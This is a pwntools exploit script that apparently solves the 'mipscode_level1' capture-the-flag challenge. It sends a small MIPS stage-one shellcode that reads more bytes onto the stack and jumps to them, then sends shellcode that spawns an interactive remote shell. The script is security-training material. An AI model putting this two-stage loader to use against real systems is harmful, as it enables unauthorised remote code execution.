from pwn import *
context.update(arch='mips', os='linux', bits=32, endian='little')
context.log_level = 'debug'
r = remote('mipscode-level1.chal.cyberjousting.com', 1356)
#r = gdb.debug('./mipscode_level1', 'b main\nc')
shellcode = '''
li $v0, 4003 
li $a0, 0 
move $a1, $sp 
li $a2, 500  
syscall 
j $sp 
nop
'''
payload = asm(shellcode)
print(len(payload), payload)
r.recvuntil(b'Shellcode> ')
r.send(payload)
sleep(1)
r.send(asm(shellcraft.sh()))
r.interactive()
